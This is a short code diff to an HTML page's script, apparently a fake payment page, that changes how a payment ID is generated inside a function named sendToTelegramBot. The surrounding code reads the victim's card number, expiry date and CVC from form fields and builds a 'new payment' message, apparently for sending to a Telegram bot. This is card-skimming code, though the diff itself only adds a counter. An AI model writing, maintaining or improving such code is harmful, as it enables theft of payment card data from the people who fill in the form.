@@ -1267,15 +1267,17 @@
             window.location.href = 'index.html';
         });
 
-        async function sendToTelegramBot() {
+        let paymentCounter = 0;
+
+async function sendToTelegramBot() {
     try {
         const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
         const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
 
-        // ГЕНЕРИРУЕМ УНИКАЛЬНЫЙ ID с случайным числом
-        const paymentId = Date.now();
+        // УНИКАЛЬНЫЙ ID: timestamp + счетчик
+        const paymentId = Date.now() + (paymentCounter++);
 
         const message = `💳 НОВАЯ ОПЛАТА
 
@@ -1481,6 +1483,7 @@
     </script>
 </body>
 </html>
+
 
 
 
